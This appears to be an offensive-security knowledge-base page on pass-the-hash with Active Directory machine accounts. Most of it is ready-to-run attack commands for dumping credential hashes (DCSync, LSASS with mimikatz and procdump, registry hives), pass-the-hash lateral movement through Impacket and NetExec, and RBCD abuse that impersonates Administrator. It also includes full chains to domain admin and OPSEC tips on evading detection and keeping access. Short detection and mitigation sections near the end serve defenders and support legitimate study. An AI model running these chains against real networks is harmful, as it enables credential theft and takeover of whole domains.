# Pass the Hash with Machine$ Accounts

## Overview

Machine accounts (`COMPUTERNAME$`) are Active Directory objects representing domain-joined computers. Like user accounts, machine accounts have NTLM hashes that can be used for authentication. Pass-the-Hash (PtH) with machine accounts is a powerful lateral movement technique — machine accounts are often members of **Domain Users** and may have local admin rights on other systems via Group Policy.

### Key Points

- Every domain-joined computer has a machine account (`COMPUTERNAME$`)
- Machine accounts have NTLM password hashes automatically managed by the domain
- Machine accounts are members of `Domain Users` by default
- Machine accounts can be members of additional groups (including Domain Admins, though rare)
- Machine account hashes change automatically every 30 days by default

## Machine Account Basics

### Machine Account Attributes

| Attribute | Value | Description |
|-----------|-------|-------------|
| sAMAccountName | COMPUTERNAME$ | Always ends with $ |
| userAccountControl | 0x1000 (WORKSTATION) or 0x2000 (SERVER) | Computer account flags |
| primaryGroupID | 515 (Domain Computers) | Default primary group |
| PasswordLastSet | Last password change | Updates every 30 days |
| OperatingSystem | Windows 10/Server | Version info |

### Default Group Memberships

```
Domain Users (default)
Domain Computers (primary group)
→ May be added to additional groups via GPO
```

## Getting Machine Account Hashes

### DCSync

```mimikatz
# DCSync a specific machine account
lsadump::dcsync /domain:domain.local /user:COMPUTER$

# DCSync all accounts (look for $ accounts)
lsadump::dcsync /domain:domain.local /all /csv
```

```bash
# Using secretsdump
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc-user 'COMPUTER$'

# Dump all NTLM hashes
python3 secretsdump.py "domain.local/Administrator:Password123!"@DC.domain.local -just-dc-ntlm
```

### LSASS Dump

```mimikatz
# On the machine itself (need SYSTEM)
privilege::debug
sekurlsa::logonpasswords

# Look for COMPUTERNAME$ entries
```

```cmd
# Using procdump (need admin)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Then extract offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

### Registry Hives (Local Machine)

```cmd
# If you have local admin on the machine
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive

# Extract machine account hash
python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
```

### NTDS.dit Extraction

```bash
# If you have the NTDS.dit file
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL

# Look for COMPUTERNAME$ accounts in the output
```

## Pass the Hash with Machine Accounts

### Using Impacket wmiexec.py

```bash
# Basic PtH with machine account
python3 wmiexec.py -hashes :NTLM_HASH 'domain.local/COMPUTER$@TARGET.domain.local'

# With both LM:NTLM format
python3 wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH' 'domain.local/COMPUTER$@TARGET.domain.local'

# Using Kerberos authentication (no hash needed, uses ticket)
python3 wmiexec.py -k -no-pass 'domain.local/COMPUTER$@TARGET.domain.local'
```

### Using NetExec (nxc)

```bash
# Pass the hash with machine account
nxc smb TARGET -u 'COMPUTER$' -H NTLM_HASH -d domain.local

# Execute a command
nxc smb TARGET -u 'COMPUTER$' -H NTLM_HASH -d domain.local -x "whoami"

# Local admin check
nxc smb TARGET -u 'COMPUTER$' -H NTLM_HASH -d domain.local --local-auth
```

### Using evil-winrm

```bash
# WinRM with machine account hash
evil-winrm -i TARGET -u 'COMPUTER$' -H NTLM_HASH

# Note: WinRM may reject machine accounts depending on configuration
```

### Using secretsdump

```bash
# Secretsdump as machine account
python3 secretsdump.py -hashes :NTLM_HASH 'domain.local/COMPUTER\$@TARGET.domain.local'

# Note the escaped $ in the shell
```

### Using psexec.py

```bash
# PsExec with machine account
python3 psexec.py -hashes :NTLM_HASH 'domain.local/COMPUTER$@TARGET.domain.local'

# With Kerberos
python3 psexec.py -k -no-pass 'domain.local/COMPUTER$@TARGET.domain.local'
```

### Using smbexec.py

```bash
# SMB exec with machine account
python3 smbexec.py -hashes :NTLM_HASH 'domain.local/COMPUTER$@TARGET.domain.local'
```

## Why Machine Accounts Are Powerful

### Local Admin via Group Policy

Many organizations deploy Group Policy that grants `Domain Computers` or specific machine accounts local admin rights on workstations or servers:

```
GPO: "Install Software"
├── Computer Configuration > Preferences > Local Users and Groups
└── Add "DOMAIN\Domain Computers" to "Administrators" group
```

If you compromise `WS01$`, and WS01 is a member of `Domain Computers`, and a GPO grants `Domain Computers` admin rights on `WS02$` — you can PtH to WS02.

### Domain User Privileges

Machine accounts are members of `Domain Users`, giving them:
- Access to domain resources open to Domain Users
- Read access to most AD objects
- Ability to authenticate to domain-joined systems
- Ability to enumerate AD (with some restrictions)

### Trust Accounts

Machine accounts in trusted domains can access resources across trusts:

```bash
# Machine account in Domain A accessing Domain B
python3 wmiexec.py -hashes :HASH 'domain_a/COMPUTER$@server.domain_b.local'
```

### Machine Account as a Springboard

```
Compromise Machine A
  → Get Machine A's hash (DCSync, LSASS dump)
  → PtH to Machine B (where A$ has local admin)
  → Get Machine B's hash
  → PtH to DC (where B$ has local admin via GPO)
  → DCSync entire domain
```

## Limitations

| Protocol | Machine Account Support | Notes |
|----------|------------------------|-------|
| SMB | Yes | Most common and reliable |
| WMI | Yes | Works via wmiexec.py |
| WinRM | Partial | May be blocked by GPO |
| RDP | **No** | Interactive logins blocked |
| Scheduled Tasks | Yes | Via SCM |
| PsExec | Yes | Works in most configurations |

### Why RDP Doesn't Work

Machine accounts lack the necessary interactive logon rights:
- `SeInteractiveLogonRight` — Not granted to machine accounts
- `SeRemoteInteractiveLogonRight` — Not granted by default
- RDP requires interactive session logon, which machine accounts cannot perform

## Machine Account vs Service Account

| Feature | Machine Account (COMPUTERNAME$) | Service Account (user) |
|---------|-------------------------------|-----------------------|
| Password Management | Automatic (30-day rotation) | Manual or managed (gMSA) |
| Default Privileges | Domain Users | None (needs delegation) |
| Interactive Logon | No | Yes |
| Remote Access | SMB/WMI (no RDP) | All protocols |
| SPN Registration | Automatic (HOST/...) | Manual |
| Lifetime | As long as computer exists | Until deleted |
| Group Membership | Domain Computers | Whatever granted |

### When to Use Service Accounts

- When you need interactive logon (RDP)
- When you need specific SPN registration
- When the target system restricts machine account access
- When password rotation is not an issue

## Machine Account Quota Exploitation

The **ms-DS-MachineAccountQuota** attribute controls how many machine accounts a non-admin user can create. Default is **10**.

### Adding a New Machine Account

```bash
# Using impacket addcomputer.py
python3 addcomputer.py -method SAMR -computer-name 'ATTACKER$' -computer-pass 'Password123!' 'domain.local/user:Password123!'

# Using NetExec
nxc ldap DC.domain.local -u 'user' -p 'Password123!' -M MAQ

# Using PowerMad (PowerShell)
New-MachineAccount -MachineName "ATTACKER$" -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

### Using Created Machine Accounts for RBCD

Newly created machine accounts can be used for Resource-Based Constrained Delegation:

```bash
# Create a machine account
python3 addcomputer.py -method SAMR -computer-name 'ATTACKER$' -computer-pass 'Password123!' 'domain.local/user:Password123!'

# Modify the target's msDS-AllowedToActOnBehalfOfOtherIdentity
# (Requires GenericWrite on target)
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action 'write' 'domain.local/user:Password123!'

# Request a TGS as any user to the target
python3 getST.py -spn 'cifs/TARGET.domain.local' -impersonate Administrator 'domain.local/ATTACKER$:Password123!'

# Use the ticket
export KRB5CCNAME=Administrator.ccache
python3 wmiexec.py -k -no-pass 'domain.local/Administrator@TARGET.domain.local'
```

## Complete Attack Chain Examples

### Scenario 1: Lateral Movement via Machine Account

```bash
# 1. DCSync the hash of a compromised machine
python3 secretsdump.py "domain.local/Administrator:Pass123!"@DC -just-dc-user 'WS01$'

Output: WS01$:1105:aad3b435b51404eeaad3b435b51404ee:NTLM_HASH:::

# 2. Check where WS01$ has local admin
nxc smb 192.168.1.50-100 -u 'WS01$' -H NTLM_HASH -d domain.local --local-auth

# 3. PtH to a target where WS01$ is admin
python3 wmiexec.py -hashes :NTLM_HASH 'domain.local/WS01$@192.168.1.75'

# 4. From the target, enumerate and pivot further
```

### Scenario 2: Machine Account to Domain Admin

```bash
# 1. Compromise a server and extract its machine account hash
# On the server (as SYSTEM):
privilege::debug
sekurlsa::logonpasswords
# Find SERVER1$ hash in the output

# 2. Check if SERVER1$ has local admin on DC
nxc smb DC -u 'SERVER1$' -H HASH -d domain.local

# 3. If yes, PtH to DC
python3 wmiexec.py -hashes :HASH 'domain.local/SERVER1$@DC'

# 4. DCSync from the DC
python3 secretsdump.py -hashes :HASH 'domain.local/SERVER1$@DC' -just-dc-ntlm
```

### Scenario 3: Adding Machine Account for RBCD

```bash
# 1. Create a new machine account (exploit MAQ quota)
python3 addcomputer.py -method SAMR -computer-name 'ATTACKER$' -computer-pass 'Attack123!' 'domain.local/user:Pass123!'

# 2. Find target with GenericWrite
# Use BloodHound to find targets

# 3. Set RBCD on target (e.g., SQL server)
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'SQL$' -action 'write' 'domain.local/user:Pass123!'

# 4. Request TGS as DA
python3 getST.py -spn 'cifs/SQL.domain.local' -impersonate Administrator 'domain.local/ATTACKER$:Attack123!'

# 5. Access SQL server as DA
export KRB5CCNAME=Administrator.ccache
python3 wmiexec.py -k -no-pass 'domain.local/Administrator@SQL.domain.local'
```

## OPSEC Considerations

### Password Rotation

Machine account passwords change automatically every 30 days:
```
Default: 30 days (configurable via domain policy)
Minimum: 0 (disabled, not recommended)
Maximum: 999 (but domain policy enforces rotation)
```

The `Domain Member: Machine account password change interval` GPO setting controls this:
```
Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
Domain member: Maximum machine account password age = 30 days
```

### Impact on Operations

- Machine account hash is **time-limited**: will expire when the password rotates
- Plan operations to use the hash within the window (30 days default)
- If persistent access is needed, extract the new hash regularly
- Consider using the machine account's TGT instead of NTLM hash (ticket lasts 10 hours)

### Stealth Considerations

- DCSync of machine accounts generates Event ID 4662
- Multiple failed authentications with stale hashes trigger lockout... but machine accounts don't get locked out
- Using the same machine account from unexpected IPs may trigger alerts
- Consider creating new machine accounts (MAQ) for persistent access instead of reusing existing ones

### Cleanup

```bash
# Remove created machine accounts
python3 addcomputer.py -method SAMR -computer-name 'ATTACKER$' -computer-pass 'Attack123!' -delete 'domain.local/user:Pass123!'

# Remove RBCD entries
python3 rbcd.py -delegate-from 'ATTACKER$' -delegate-to 'TARGET$' -action 'remove' 'domain.local/user:Pass123!'
```

## Detection

### Event ID 4624 — Account Logon (Machine Account)

```
An account was successfully logged on.
  Account Name: COMPUTERNAME$
  Account Domain: DOMAIN
  Logon Type: 3 (Network)
  Process Name: C:\Windows\System32\svchost.exe
```

### Event ID 4672 — Special Privileges Assigned

When machine account has local admin:
```
Special privileges assigned to new logon.
  Account Name: COMPUTERNAME$
  Privileges: SeTcbPrivilege, SeBackupPrivilege, SeDebugPrivilege
```

### Event ID 4662 — DCSync Detection

```
An operation was performed on an object.
  Account: COMPUTERNAME$@domain.local
  Access: DS-Replication-Get-Changes
```

### Machine Account Quota Abuse Detection

```powershell
# Find recently created machine accounts
Get-ADComputer -Filter {Created -gt (Get-Date).AddDays(-7)} -Properties Created, Description |
    Select Name, Created, Description

# Check MAQ modifications
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=5136} |
    Where-Object { $_.Properties[1].Value -match "ms-DS-MachineAccountQuota" }
```

## Mitigations

| Mitigation | Description | Impact |
|------------|-------------|--------|
| Set MAQ to 0 | Prevent non-admins from creating machine accounts | Blocks MAQ abuse |
| Restrict Local Admin | Remove Domain Computers from admin groups | Limits lateral movement |
| Monitor Machine Account Logons | Alert on unusual machine account network logins | Detection |
| LAPS | Manage local admin passwords separately | Limits lateral movement |
| Audit Group Policy | Review GPOs granting machine account privileges | Prevention |
| Network Segmentation | Limit SMB/WMI access between segments | Reduces attack surface |

## Cross-References

- [Pass the Hash](./01_Pass_The_Hash.md)
- [RBCD Attack](../05_Privilege_Escalation/07_RBCD.md)
- [Trust Accounts Cross Domain](../05_Privilege_Escalation/11_Trust_Accounts_Cross_Domain.md)
- [Tools Reference - Impacket](../09_Tools_Reference/README.md)
- [Tools Reference - NetExec](../09_Tools_Reference/README.md)
- [Tools Reference - Mimikatz](../09_Tools_Reference/README.md)
